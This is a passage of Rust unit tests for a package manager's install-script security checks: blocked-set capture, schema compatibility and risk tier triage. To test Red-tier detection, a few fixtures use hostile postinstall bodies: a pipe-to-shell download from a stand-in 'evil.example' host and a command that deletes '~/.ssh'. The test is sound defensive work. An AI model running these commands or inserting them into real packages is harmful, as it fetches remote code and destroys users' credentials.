        // captured script_hash from cap1 so the binding matches)
        let policy = rich_policy(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some(&captured_script_hash),
        );
        let cap2 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
        assert!(cap2.should_emit_warning);
        assert!(
            cap2.all_clear_banner,
            "transition from blocked → all approved must surface as positive banner"
        );
        assert!(cap2.state.blocked_packages.is_empty());

        // Third install with the same policy → silent (no positive banner spam)
        let cap3 =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();
        assert!(
            !cap3.should_emit_warning,
            "after the all-clear banner, repeated installs are silent"
        );
    }

    #[test]
    fn capture_marks_drifted_packages_with_binding_drift_flag() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // Policy approves esbuild but with a STALE script hash → drift
        let policy = rich_policy("esbuild", "0.25.1", Some("sha512-x"), Some("sha256-stale"));
        let installed = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &policy).unwrap();

        assert!(capture.should_emit_warning);
        assert_eq!(capture.state.blocked_packages.len(), 1);
        assert!(
            capture.state.blocked_packages[0].binding_drift,
            "drifted approval must be flagged"
        );
    }

    #[test]
    fn capture_skips_packages_with_no_install_phases() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "tsc",
            "5.0.0",
            // build/test ARE in the package.json but NOT in EXECUTED_INSTALL_PHASES
            &serde_json::json!({"build": "tsc", "test": "vitest"}),
        );
        let store = fake_store_at(store_root.path());

        let capture = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("tsc".to_string(), "5.0.0".to_string(), None)],
            &empty_policy(),
        )
        .unwrap();
        assert!(capture.state.blocked_packages.is_empty());
        assert!(!capture.should_emit_warning);
    }

    #[test]
    fn capture_legacy_name_only_approval_does_not_block() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());

        // Legacy bare-name entry — covers esbuild leniently
        let policy = SecurityPolicy {
            trusted_dependencies: TrustedDependencies::Legacy(vec!["esbuild".to_string()]),
            minimum_release_age_secs: 0,
        };

        let capture = capture_blocked_set_after_install(
            project.path(),
            &store,
            &[("esbuild".to_string(), "0.25.1".to_string(), None)],
            &policy,
        )
        .unwrap();

        // Legacy approval is enough to NOT block (rebuild will run the script
        // with a deprecation warning). The blocked set is for things the
        // user must REVIEW.
        assert!(capture.state.blocked_packages.is_empty());
        assert!(!capture.should_emit_warning);
    }

    #[test]
    fn capture_writes_state_file_on_every_call_even_when_silent() {
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = fake_store_at(store_root.path());

        // First call: silent (no installed packages), but state file written
        let cap1 = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
            .unwrap();
        assert!(!cap1.should_emit_warning);
        assert!(read_build_state(project.path()).is_some());

        // Captured_at is updated even if fingerprint is unchanged
        let captured_at_1 = read_build_state(project.path()).unwrap().captured_at;

        std::thread::sleep(std::time::Duration::from_millis(1100));

        let _ = capture_blocked_set_after_install(project.path(), &store, &[], &empty_policy())
            .unwrap();
        let captured_at_2 = read_build_state(project.path()).unwrap().captured_at;
        assert_ne!(
            captured_at_1, captured_at_2,
            "captured_at must refresh on every install"
        );
    }

    // ─── schema compatibility ─────────────────────────────
    //
    // The no-version-bump strategy (see `BUILD_STATE_VERSION` doc)
    // requires BOTH directions of compat to hold:
    //
    //   1. A reader on a v1-written file defaults the new
    //      fields to None via #[serde(default)] (backward compat).
    //   2. A v1 reader on a file silently drops the
    //      new fields because the struct lacks deny_unknown_fields
    //      (forward compat).
    //
    // Both are here so a regression in either direction fails CI.

    #[test]
    fn reader_defaults_missing_added_fields_from_v1_json() {
        // Hand-written JSON as a pre-existing writer would produce:
        // only the v1 fields, no static_tier / provenance / etc.
        let v1_json = r#"{
            "state_version": 1,
            "blocked_set_fingerprint": "sha256-legacy",
            "captured_at": "T00:00:00Z",
            "blocked_packages": [
                {
                    "name": "esbuild",
                    "version": "0.25.1",
                    "integrity": "sha512-x",
                    "script_hash": "sha256-y",
                    "phases_present": ["postinstall"],
                    "binding_drift": false
                }
            ]
        }"#;

        let state: BuildState = serde_json::from_str(v1_json).unwrap();
        assert_eq!(state.state_version, 1);
        assert_eq!(state.blocked_packages.len(), 1);

        let pkg = &state.blocked_packages[0];
        // All additions must default to None without the
        // JSON naming them explicitly.
        assert_eq!(pkg.static_tier, None);
        assert_eq!(pkg.provenance_at_capture, None);
        assert_eq!(pkg.published_at, None);
        assert_eq!(pkg.behavioral_tags_hash, None);

        // v1 semantics preserved end-to-end.
        assert_eq!(pkg.name, "esbuild");
        assert!(!pkg.binding_drift);
    }

    #[test]
    fn v1_reader_silently_drops_added_fields_on_read() {
        // Simulate a v1 reader by defining a struct that ONLY has the
        // v1 fields. A JSON must parse into it with
        // all v1 fields intact; the unknown fields must be
        // silently dropped because no `deny_unknown_fields` is in
        // effect.
        #[derive(Debug, Deserialize, PartialEq, Eq)]
        struct V1BlockedPackage {
            name: String,
            version: String,
            integrity: Option<String>,
            script_hash: Option<String>,
            phases_present: Vec<String>,
            binding_drift: bool,
        }

        let package_with_added_fields = BlockedPackage {
            name: "sharp".into(),
            version: "0.33.0".into(),
            source: Some("registry+https://registry.npmjs.org".into()),
            integrity: Some("sha512-aaa".into()),
            script_hash: Some("sha256-bbb".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: Some(StaticTier::Amber),
            provenance_at_capture: Some(ProvenanceSnapshot {
                present: true,
                publisher: Some("github:lovell/sharp".into()),
                ..Default::default()
            }),
            published_at: Some("T00:00:00Z".into()),
            behavioral_tags_hash: Some("sha256-ccc".into()),
            behavioral_tags: Some(vec!["network".into(), "shell".into()]),
        };
        let json = serde_json::to_string(&package_with_added_fields).unwrap();

        let v1: V1BlockedPackage = serde_json::from_str(&json).unwrap();
        assert_eq!(v1.name, "sharp");
        assert_eq!(v1.version, "0.33.0");
        assert_eq!(v1.integrity.as_deref(), Some("sha512-aaa"));
        assert_eq!(v1.script_hash.as_deref(), Some("sha256-bbb"));
        assert_eq!(v1.phases_present, vec!["postinstall".to_string()]);
        assert!(!v1.binding_drift);
    }

    #[test]
    fn populated_added_fields_roundtrip() {
        let original = BlockedPackage {
            name: "puppeteer".into(),
            version: "22.0.0".into(),
            source: Some("registry+https://registry.npmjs.org".into()),
            integrity: Some("sha512-pp".into()),
            script_hash: Some("sha256-pp".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: Some(StaticTier::Amber),
            provenance_at_capture: Some(ProvenanceSnapshot {
                present: true,
                publisher: Some("github:puppeteer/puppeteer".into()),
                workflow_path: Some(".github/workflows/publish.yml".into()),
                workflow_ref: Some("refs/tags/v22.0.0".into()),
                attestation_cert_sha256: Some("sha256-cert".into()),
            }),
            published_at: Some("T12:34:56Z".into()),
            behavioral_tags_hash: Some("sha256-tags".into()),
            behavioral_tags: Some(vec!["childProcess".into(), "network".into()]),
        };
        let json = serde_json::to_string(&original).unwrap();
        let back: BlockedPackage = serde_json::from_str(&json).unwrap();
        assert_eq!(original, back);
    }

    #[test]
    fn read_build_state_rejects_newer_version() {
        // Simulate a future LPM binary writing state_version = 2.
        // This binary's reader must refuse and return None (the
        // caller will write a fresh v1 state, not mis-interpret v2
        // semantics with v1 types).
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let future_json = format!(
            r#"{{
                "state_version": {next_version},
                "blocked_set_fingerprint": "sha256-future",
                "captured_at": "2027-01-01T00:00:00Z",
                "blocked_packages": []
            }}"#,
            next_version = BUILD_STATE_VERSION + 1,
        );
        std::fs::write(build_state_path(project.path()), future_json).unwrap();

        assert!(
            read_build_state(project.path()).is_none(),
            "reader must refuse files newer than BUILD_STATE_VERSION"
        );
    }

    #[test]
    fn read_build_state_accepts_equal_version() {
        // Sanity check for the `>` comparison: equal version parses.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let state = make_state(vec![make_blocked(
            "esbuild",
            "0.25.1",
            Some("sha512-x"),
            Some("sha256-y"),
        )]);
        let json = serde_json::to_string(&state).unwrap();
        std::fs::write(build_state_path(project.path()), json).unwrap();

        let read = read_build_state(project.path());
        assert!(
            read.is_some(),
            "reader must accept files at the current BUILD_STATE_VERSION"
        );
        assert_eq!(read.unwrap().blocked_packages.len(), 1);
    }

    // ───: metadata plumbing ───────────────────────────
    //
    // The `_with_metadata` variants forward `published_at` and
    // `behavioral_tags_hash` onto captured `BlockedPackage` entries.
    // The caller (install.rs) populates the map from the registry
    // metadata the cooldown check already fetched.

    fn make_metadata(
        published_at: Option<&str>,
        behavioral_tags_hash: Option<&str>,
    ) -> BlockedSetMetadataEntry {
        BlockedSetMetadataEntry {
            published_at: published_at.map(String::from),
            behavioral_tags_hash: behavioral_tags_hash.map(String::from),
            // the tests don't stress
            // provenance_at_capture; use `Default` so future fields
            // don't force every test-helper re-edit. Dedicated
            // provenance capture tests live in lpm-security and in
            // the E2E harness.
            ..Default::default()
        }
    }

    fn store_pkg_with_postinstall(store: &lpm_store::PackageStore, name: &str, version: &str) {
        let pkg_dir = store.package_dir(name, version);
        std::fs::create_dir_all(&pkg_dir).unwrap();
        std::fs::write(
            pkg_dir.join("package.json"),
            format!(
                r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"node install.js"}}}}"#
            ),
        )
        .unwrap();
    }

    #[test]
    fn compute_with_metadata_forwards_published_at_and_behavioral_tags_hash() {
        // Core contract: when the caller supplies metadata for a
        // blockable package, both optional fields on the emitted
        // BlockedPackage are populated verbatim.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        let mut metadata = BlockedSetMetadata::default();
        metadata.insert(
            "sharp".to_string(),
            "0.33.0".to_string(),
            None,
            make_metadata(Some("T12:34:56Z"), Some("sha256-tag-hash-abc")),
        );

        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &metadata,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(blocked[0].name, "sharp");
        assert_eq!(
            blocked[0].published_at.as_deref(),
            Some("T12:34:56Z"),
            "published_at MUST be forwarded from metadata map to BlockedPackage"
        );
        assert_eq!(
            blocked[0].behavioral_tags_hash.as_deref(),
            Some("sha256-tag-hash-abc"),
            "behavioral_tags_hash MUST be forwarded from metadata map to BlockedPackage"
        );
    }

    #[test]
    fn compute_with_metadata_missing_entry_leaves_fields_none() {
        // Graceful degradation: when the caller has NO metadata for a
        // package (offline, fast-path, registry error), both         // fields stay None on the emitted BlockedPackage.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        // Empty metadata map — caller didn't fetch / couldn't fetch.
        let metadata = BlockedSetMetadata::default();

        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &metadata,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 1);
        assert!(
            blocked[0].published_at.is_none(),
            "missing metadata entry → published_at stays None (graceful)"
        );
        assert!(
            blocked[0].behavioral_tags_hash.is_none(),
            "missing metadata entry → behavioral_tags_hash stays None (graceful)"
        );
    }

    #[test]
    fn compute_with_metadata_partial_entry_forwards_only_populated_half() {
        // One field present, one absent: forward what we have, leave
        // the other None. Common real-world case: npm packages often
        // have a `time` entry but no server-side behavioral analysis.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "some-npm-pkg", "1.0.0");

        let installed = vec![("some-npm-pkg".to_string(), "1.0.0".to_string(), None)];
        let mut metadata = BlockedSetMetadata::default();
        metadata.insert(
            "some-npm-pkg".to_string(),
            "1.0.0".to_string(),
            None,
            make_metadata(Some("T00:00:00Z"), None),
        );

        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &metadata,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].published_at.as_deref(),
            Some("T00:00:00Z"),
            "populated half forwards"
        );
        assert!(
            blocked[0].behavioral_tags_hash.is_none(),
            "unpopulated half stays None (no server analysis)"
        );
    }

    #[test]
    fn backward_compat_wrapper_captures_with_empty_metadata() {
        // `capture_blocked_set_after_install` (no-metadata variant)
        // remains a valid entry point; it just produces BlockedPackage
        // entries with both fields as None. Pins the wrapper
        // contract for the ~30 test callers that use it.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        let capture =
            capture_blocked_set_after_install(project.path(), &store, &installed, &empty_policy())
                .unwrap();

        assert_eq!(capture.state.blocked_packages.len(), 1);
        let pkg = &capture.state.blocked_packages[0];
        assert!(
            pkg.published_at.is_none() && pkg.behavioral_tags_hash.is_none(),
            "no-metadata wrapper must leave both fields None"
        );
    }

    #[test]
    fn metadata_fingerprint_is_independent_of_metadata() {
        // Design invariant: the blocked-set fingerprint is a stability
        // metric over *blockable* packages and their strict binding
        // tuple, NOT over their metadata. Installs with differing
        // published_at / behavioral_tags_hash but same blocked set
        // MUST produce identical fingerprints. Otherwise the post-
        // install "blocked set unchanged" suppression would spuriously
        // re-fire on registry metadata churn.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_postinstall(&store, "sharp", "0.33.0");

        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
        let meta_a = {
            let mut m = BlockedSetMetadata::default();
            m.insert(
                "sharp".to_string(),
                "0.33.0".to_string(),
                None,
                make_metadata(Some("T00:00:00Z"), Some("sha256-aaa")),
            );
            m
        };
        let meta_b = {
            let mut m = BlockedSetMetadata::default();
            m.insert(
                "sharp".to_string(),
                "0.33.0".to_string(),
                None,
                make_metadata(Some("T00:00:00Z"), Some("sha256-bbb")),
            );
            m
        };

        let bp_a = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &meta_a,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );
        let bp_b = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &meta_b,
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );
        let fp_a = compute_blocked_set_fingerprint(&bp_a);
        let fp_b = compute_blocked_set_fingerprint(&bp_b);
        assert_eq!(
            fp_a, fp_b,
            "fingerprint must be independent of metadata-only fields — \
             otherwise registry churn would spuriously re-fire the \
             post-install blocked-set warning"
        );
    }

    // ── — read_install_phase_bodies + static_tier ─

    fn store_pkg_with_scripts(
        store: &lpm_store::PackageStore,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        let pkg_dir = store.package_dir(name, version);
        std::fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        std::fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    #[test]
    fn read_install_phase_bodies_returns_pairs_in_canonical_order() {
        // Even if `scripts` is authored with postinstall before
        // preinstall, the output order must match
        // EXECUTED_INSTALL_PHASES (preinstall, install, postinstall)
        // so worst-wins aggregation is stable across JSON
        // re-serialization.
        let project = tempdir().unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "x",
            "1.0.0",
            &serde_json::json!({
                "postinstall": "tsc",
                "preinstall": "husky install",
                "other": "irrelevant"
            }),
        );

        let pkg_dir = store.package_dir("x", "1.0.0");
        let pairs = read_install_phase_bodies(&pkg_dir);
        assert_eq!(
            pairs,
            vec![
                ("preinstall".to_string(), "husky install".to_string()),
                ("postinstall".to_string(), "tsc".to_string()),
            ],
            "phases must emit in EXECUTED_INSTALL_PHASES order",
        );
    }

    #[test]
    fn read_install_phase_bodies_skips_empty_body_phases() {
        let project = tempdir().unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "x",
            "1.0.0",
            &serde_json::json!({ "preinstall": "", "postinstall": "tsc" }),
        );

        let pkg_dir = store.package_dir("x", "1.0.0");
        let pairs = read_install_phase_bodies(&pkg_dir);
        assert_eq!(pairs, vec![("postinstall".to_string(), "tsc".to_string())]);
    }

    #[test]
    fn read_install_phase_bodies_returns_empty_on_missing_file_or_malformed_json() {
        let project = tempdir().unwrap();
        let missing = project.path().join("nonexistent");
        assert!(read_install_phase_bodies(&missing).is_empty());

        let malformed = project.path().join("malformed");
        std::fs::create_dir_all(&malformed).unwrap();
        std::fs::write(malformed.join("package.json"), "{not json").unwrap();
        assert!(read_install_phase_bodies(&malformed).is_empty());

        let no_scripts = project.path().join("no-scripts");
        std::fs::create_dir_all(&no_scripts).unwrap();
        std::fs::write(no_scripts.join("package.json"), r#"{"name":"x"}"#).unwrap();
        assert!(read_install_phase_bodies(&no_scripts).is_empty());
    }

    #[test]
    fn compute_with_metadata_populates_green_static_tier_for_green_script() {
        // A single green-allowlisted script body → the emitted
        // BlockedPackage carries `static_tier = Some(Green)`.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "typescript",
            "5.0.0",
            &serde_json::json!({ "postinstall": "tsc" }),
        );

        let installed = vec![("typescript".to_string(), "5.0.0".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Green),
            "green-allowlisted script body MUST populate Green tier",
        );
    }

    #[test]
    fn compute_with_metadata_populates_red_static_tier_for_pipe_to_shell() {
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "evil-pkg",
            "0.0.1",
            &serde_json::json!({ "postinstall": "curl https://evil.example | sh" }),
        );

        let installed = vec![("evil-pkg".to_string(), "0.0.1".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Red),
            "pipe-to-shell body MUST populate Red tier",
        );
    }

    #[test]
    fn compute_with_metadata_worst_wins_red_dominates_green_across_phases() {
        // A package with one green phase AND one red phase must
        // aggregate to Red (worst-wins). This is the core
        // cross-phase aggregation invariant.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "mixed-pkg",
            "1.0.0",
            &serde_json::json!({
                "preinstall": "tsc",
                "postinstall": "rm -rf ~/.ssh",
            }),
        );

        let installed = vec![("mixed-pkg".to_string(), "1.0.0".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Red),
            "green + red across phases MUST aggregate to Red",
        );
        assert_eq!(
            blocked[0].phases_present,
            vec!["preinstall".to_string(), "postinstall".to_string()],
            "phases_present should list BOTH present phases",
        );
    }

    // ── advisor-approved packages are excluded
    //                       from the persisted blocked set ──────────

    #[test]
    fn slice1_advisor_approved_amber_excluded_from_blocked_set() {
        // A package the advisor approves this run must NOT appear in the
        // blocked set written to `.lpm/build-state.json`. Without
        // this, post-install JSON + the "remain blocked after auto-
        // build" pointer would emit stale state for packages whose
        // scripts already executed via AdvisorApprovedThisRun.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "amber-pkg",
            "1.0.0",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let installed = vec![(
            "amber-pkg".to_string(),
            "1.0.0".to_string(),
            Some("sha512-test-integrity".to_string()),
        )];

        // Baseline: NO approvals → package appears in blocked set.
        let blocked_without_approval = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );
        assert_eq!(blocked_without_approval.len(), 1);
        assert_eq!(blocked_without_approval[0].name, "amber-pkg");

        // With the matching triple in the approval set: EXCLUDED.
        let mut approvals = std::collections::HashSet::new();
        approvals.insert((
            "amber-pkg".to_string(),
            "1.0.0".to_string(),
            None,
            Some("sha512-test-integrity".to_string()),
            String::new(),
        ));
        let blocked_with_approval = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            Some(&approvals),
        );
        assert!(
            blocked_with_approval.is_empty(),
            "advisor-approved package must be excluded; got {:?}",
            blocked_with_approval
                .iter()
                .map(|b| &b.name)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn slice1_approval_for_other_integrity_does_not_exclude_blocked() {
        // Counter-test for the source-aware key: an approval that
        // shares (name, version) but has different integrity must
        // NOT remove this install's package from the blocked set.
        // Without integrity in the key, the previous run's approval
        // on the registry copy could silently mask the workspace
        // copy's blocked entry.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "amber-pkg",
            "1.0.0",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let installed = vec![(
            "amber-pkg".to_string(),
            "1.0.0".to_string(),
            Some("sha512-WORKSPACE-source".to_string()),
        )];

        // Approve a DIFFERENT integrity for the same coord.
        let mut approvals = std::collections::HashSet::new();
        approvals.insert((
            "amber-pkg".to_string(),
            "1.0.0".to_string(),
            None,
            Some("sha512-REGISTRY-source".to_string()),
            String::new(),
        ));
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            Some(&approvals),
        );
        assert_eq!(
            blocked.len(),
            1,
            "different-integrity approval must not cross-exclude"
        );
    }

    #[test]
    fn compute_with_metadata_worst_wins_amber_dominates_green_across_phases() {
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        store_pkg_with_scripts(
            &store,
            "native-pkg",
            "1.0.0",
            &serde_json::json!({
                "preinstall": "tsc",
                "postinstall": "node install.js",
            }),
        );

        let installed = vec![("native-pkg".to_string(), "1.0.0".to_string(), None)];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(
            blocked[0].static_tier,
            Some(lpm_security::triage::StaticTier::Amber),
            "green + amber across phases MUST aggregate to Amber",
        );
    }

    #[test]
    fn compute_with_metadata_static_tier_is_always_some_for_blocked_entries() {
        // Because compute_blocked_packages_with_metadata skips any
        // package without at least one present phase body, every
        // emitted BlockedPackage must have Some(_) for static_tier.
        // This locks in the "None means pre-P2 state, never fresh
        // state" contract that `blocked_to_json` and approve-scripts
        // UI rely on.
        let project = tempdir().unwrap();
        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
        let store = lpm_store::PackageStore::at(project.path().join("store"));
        for (name, script) in [
            ("green-pkg", "tsc"),
            ("amber-pkg", "playwright install"),
            ("red-pkg", "curl https://x | sh"),
        ] {
            store_pkg_with_scripts(
                &store,
                name,
                "1.0.0",
                &serde_json::json!({ "postinstall": script }),
            );
        }

        let installed = vec![
            ("green-pkg".to_string(), "1.0.0".to_string(), None),
            ("amber-pkg".to_string(), "1.0.0".to_string(), None),
            ("red-pkg".to_string(), "1.0.0".to_string(), None),
        ];
        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &empty_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            None,
        );

        assert_eq!(blocked.len(), 3);
        for bp in &blocked {
            assert!(
                bp.static_tier.is_some(),
                "freshly computed BlockedPackage MUST have Some(tier), \
                 got None for {}@{}",
                bp.name,
                bp.version,
            );
        }
    }

    // ── — count_blocked_by_tier + format_triage_summary_line ─

    fn tiered(name: &str, tier: lpm_security::triage::StaticTier) -> BlockedPackage {
        let mut b = make_blocked(name, "1.0.0", None, Some("sha256-x"));
        b.static_tier = Some(tier);
        b
    }

    #[test]
    fn count_blocked_by_tier_empty_returns_zeros() {
        let blocked: Vec<BlockedPackage> = Vec::new();
        assert_eq!(count_blocked_by_tier(&blocked), (0, 0, 0));
    }

    #[test]
    fn count_blocked_by_tier_counts_green_amber_red_distinctly() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            tiered("a", StaticTier::Green),
            tiered("b", StaticTier::Green),
            tiered("c", StaticTier::Amber),
            tiered("d", StaticTier::Red),
        ];
        assert_eq!(count_blocked_by_tier(&blocked), (2, 1, 1));
    }

    #[test]
    fn count_blocked_by_tier_amber_llm_counts_as_amber() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            tiered("a", StaticTier::Amber),
            tiered("b", StaticTier::AmberLlm),
        ];
        assert_eq!(
            count_blocked_by_tier(&blocked),
            (0, 2, 0),
            "AmberLlm must count as amber for display — indistinguishable \
             to the user's 'needs review' mental model"
        );
    }

    #[test]
    fn count_blocked_by_tier_none_counts_as_amber_conservative() {
        // Pre-P2 persisted state (static_tier = None) should count as
        // amber so the user sees it in the "needs review" bucket
        // rather than being silently hidden.
        let blocked = vec![make_blocked("pre-p2", "1.0.0", None, Some("sha256-x"))];
        assert!(blocked[0].static_tier.is_none());
        assert_eq!(count_blocked_by_tier(&blocked), (0, 1, 0));
    }

    #[test]
    fn format_triage_summary_line_shape_is_stable() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            tiered("green-a", StaticTier::Green),
            tiered("green-b", StaticTier::Green),
            tiered("amber-a", StaticTier::Amber),
            tiered("red-a", StaticTier::Red),
        ];
        // Snapshot — the anchor prefix and suffix are-stable
        // agent-parseable contracts. Changing them is a breaking
        // output change for any CI script that greps this line.
        assert_eq!(
            format_triage_summary_line(&blocked),
            "script-policy: triage (2 green / 1 amber / 1 red → lpm approve-scripts)"
        );
    }

    #[test]
    fn format_triage_summary_line_all_zero_when_empty() {
        assert_eq!(
            format_triage_summary_line(&[]),
            "script-policy: triage (0 green / 0 amber / 0 red → lpm approve-scripts)"
        );
    }

    #[test]
    fn format_triage_summary_line_anchor_and_suffix_present() {
        use lpm_security::triage::StaticTier;
        // Defensive against accidental format drift — agents
        // substring-match on these two anchors.
        let line = format_triage_summary_line(&[tiered("x", StaticTier::Green)]);
        assert!(
            line.starts_with("script-policy: triage ("),
            "line must start with the stable anchor; got: {line}"
        );
        assert!(
            line.ends_with(" → lpm approve-scripts)"),
            "line must end with the stable suffix; got: {line}"
        );
    }

    // ── capability widening
    //    must land in the blocked set even under strict match ──

    /// A package whose script-hash approval satisfies `TrustMatch::Strict`
    /// but whose current
    /// capability request widens beyond the user bound MUST be
    /// included in the blocked set so `lpm approve-scripts`
    /// surfaces it. Without this, install-time capture silently
    /// drops the package and the user has no path to resolve the
    /// downstream `CapabilityNotApproved` that `lpm rebuild` emits.
    #[test]
    fn capability_widening_under_strict_match_lands_in_blocked_set() {
        use crate::capability::{CapabilitySet, ReadProjectMode, UserBound};

        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
